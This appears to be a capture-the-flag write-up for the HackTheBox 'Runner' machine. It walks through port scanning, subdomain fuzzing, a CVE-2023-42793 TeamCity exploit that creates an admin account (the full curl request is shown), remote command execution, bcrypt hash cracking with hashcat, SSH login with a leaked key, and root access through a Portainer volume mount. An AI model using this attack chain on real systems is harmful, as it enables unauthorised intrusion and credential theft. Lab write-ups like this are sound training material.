@@ -1,0 +1,226 @@
+runner.htb
+
+RECON
+
+PORT SCANNING
+
+sed@pop-os:~/sed/runner.htb$
+
+.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
+| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
+| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
+`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
+The Modern Day Port Scanner.
+Open 10.10.11.13:22
+Open 10.10.11.13:80
+Open 10.10.11.13:8000
+[~] Starting Script(s)
+[>] Running script "nmap -vvv -p {{port}} {{ip}} -sCV" on ip 10.10.11.13
+PORT     STATE SERVICE     REASON  VERSION
+22/tcp   open  ssh         syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http        syn-ack nginx 1.18.0 (Ubuntu)
+| http-methods: 
+|_  Supported Methods: GET HEAD
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Runner - CI/CD Specialists
+8000/tcp open  nagios-nsca syn-ack Nagios NSCA
+|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+FOUND NOTHING ON DIRSEARCH
+
+FUZZING SUBDOMAINS
+
+sed@pop-os:~/sed/runner.htb$ ffuf -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -u "http://runner.htb" -H "Host:FUZZ.runner.htb" -mc 200,401 -t 300
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.1.0
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://runner.htb
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt
+ :: Header           : Host: FUZZ.runner.htb
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 300
+ :: Matcher          : Response status: 200,401
+________________________________________________
+
+teamcity                [Status: 401, Size: 66, Words: 8, Lines: 2]
+[WARN] Caught keyboard interrupt (Ctrl-C)
+
+ADDING the subdomain to the hosts file
+
+FOUND the EXPLOIT by simply searching the version number on google
+
+https://github.com/Zyad-Elsayed/CVE-2023-42793
+
+Cloing and running the exploit 
+
+sed@pop-os:~/sed/runner.htb/CVE-2023-42793$ python3 exploit.py -u http://teamcity.runner.htb -v
+
+=====================================================
+*                                                   *
+*              CVE-2023-42793                       *
+*        TeamCity Admin Account Creation            *
+*                                                   *
+=====================================================
+
+Token: eyJ0eXAiOiAiVENWMiJ9.WnIyTWdKRU5OVFdvV3BxdXYyNWtWaFVRMHNn.MmRjY2U2ZWYtZjQxNy00ZTQ0LTliNjMtMDdjNmQyZTE3NDQ5
+Token saved to ./token
+Successfully exploited!
+URL: http://teamcity.runner.htb
+Username: admin.4aCz
+Password: Password@123
+Final curl command: curl --path-as-is -H "Authorization: Bearer eyJ0eXAiOiAiVENWMiJ9.WnIyTWdKRU5OVFdvV3BxdXYyNWtWaFVRMHNn.MmRjY2U2ZWYtZjQxNy00ZTQ0LTliNjMtMDdjNmQyZTE3NDQ5" -X POST http://teamcity.runner.htb/app/rest/users -H "Content-Type: application/json" --data '{"username": "admin.4aCz", "password": "Password@123", "email": "admin.4aCz@lol.omg", "roles": {"role": [{"roleId": "SYSTEM_ADMIN", "scope": "g"}]}}'
+
+
+with rce.py we can run simply execute a revshell
+
+sed@pop-os:~/sed/runner.htb/CVE-2023-42793$ python3 rce.py -u http://teamcity.runner.htb -t token -c "whoami"
+StdOut:tcuser
+
+StdErr: 
+Exit code: 0
+Time: 25ms
+
+sed@pop-os:~/sed/runner.htb/CVE-2023-42793$ python3 rce.py -u http://teamcity.runner.htb -t token -c "pwd"
+StdOut:/opt/teamcity/bin
+
+StdErr: 
+Exit code: 0
+
+seems the webapplication is containerized need to find a workaround
+
+after browsing the admin panel found user lists and backups
+
+so the backup option dumps all the data into a zip file
+
+downloaded the zip file and in TeamCity_Backup_20240605_081944/database_dump we have users
+
+ID, USERNAME, PASSWORD, NAME, EMAIL, LAST_LOGIN_TIMESTAMP, ALGORITHM
+1, admin, $2a$07$5mTp3jjkTVORmPoGxaJAZukcgfDsHjWB.kD2f0JBm4TiC0ozUWTFy, John, john@runner.htb, 1717574675203, BCRYPT
+2, matthew, $2a$07$q.m8WQP8niXODv55lJVovOmxGtg6K/YPHbD48/JQsdGLulmeVo.Em, Matthew, matthew@runner.htb, 1709150421438, BCRYPT
+11, admin.4acz, $2a$07$NxG6JInFkRAo38v8g4DJ2OhQjIay08AXIH9AJMGntHHOiVmr.MzUa, , admin.4aCz@lol.omg, 1717575040972, BCRYPT
+12, admin.pnrd, $2a$07$SL9TTkI/Rr2NB0kLJvj4vuQotP2pbPreheKjfAgM6ZZixqA6ckx5O, , admin.PnRd@lol.omg, , BCRYPT
+
+dehashing admin user with hashcat
+
+failed to dehash admin 
+
+dehashing matthew 
+
+sed@pop-os:~/sed/runner.htb$ sudo hashcat -a 0 -m 3200 hash2.txt /usr/share/seclists/rockyou.txt -w 3 -O -d 1
+[sudo] password for sed: 
+hashcat (v6.2.5) starting
+
+Dictionary cache hit:
+* Filename..: /usr/share/seclists/rockyou.txt
+* Passwords.: 14344384
+* Bytes.....: 139921497
+* Keyspace..: 14344384
+
+
+$2a$07$q.m8WQP8niXODv55lJVovOmxGtg6K/YPHbD48/JQsdGLulmeVo.Em:piper123
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
+Hash.Target......: $2a$07$q.m8WQP8niXODv55lJVovOmxGtg6K/YPHbD48/JQsdGL...eVo.Em
+Time.Started.....: Wed Jun  5 16:45:48 2024 (10 secs)
+Time.Estimated...: Wed Jun  5 16:45:58 2024 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/seclists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:     5256 H/s (66.43ms) @ Accel:64 Loops:64 Thr:11 Vec:1
+Recovered........: 1/1 (100.00%) Digests
+Progress.........: 52096/14344384 (0.36%)
+Rejected.........: 0/52096 (0.00%)
+Restore.Point....: 51392/14344384 (0.36%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:64-128
+Candidate.Engine.: Device Generator
+Candidates.#1....: LUDACRIS -> mylove25
+Hardware.Mon.#1..: Temp: 49c Util:100% Core:2002MHz Mem:7000MHz Bus:16
+
+getting permission denied while doing SSH
+
+after some exploring the admin backup found a ssh private key in folder
+
+TeamCity_Backup_20240605_081944/config/projects/AllProjects/pluginData/ssh_keys
+
+VOILA LOGGED IN WITH USER JOHN 
+
+sed@pop-os:~/sed/runner.htb$ ssh -i id_rsa john@runner.htb
+
+Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-102-generic x86_64)
+
+FOUND USER FLAG
+john@runner:~$ cat user.txt 
+5636ec7810f3e9376a3c7fa3303dc6e7
+
+PRIV ESCALATION
+
+Ran LINPEAS.sh to find something useful 
+Found
+a service running on port 9000
+
+╔══════════╣ Active Ports
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
+tcp        0      0 127.0.0.1:9000          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:5005          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:8111          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:9443          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::80                   :::*                    LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+tcp6       0      0 :::8000                 :::*                    LISTEN      -                   
+
+after more searching found the hidden host 
+john@runner:~$ cat /etc/hosts
+127.0.0.1 localhost
+127.0.1.1 runner runner.htb teamcity.runner.htb portainer-administration.runner.htb
+
+using matthew's credentials to login to portrainer
+
+after some google search found this article
+
+https://rioasmara.com/2021/08/15/use-portainer-for-privilege-escalation/
+
+following the article to get root.txt
+
+firstly we need to create a volume 
+then we need to create a container with docker image name 
+
+
+In command & logging tab select
+Interactive & TTY
+
+In the volumes section 
+set container to /mnt/root
+and volume to <your-volume>-local
+
+deploy volume 
+then
+deploy the container
+go to console and 
+change the directory to 
+
+/mnt/root/root/
+
+cat root.txt
+
+you got the root flag
+
+happy hacking
+
+
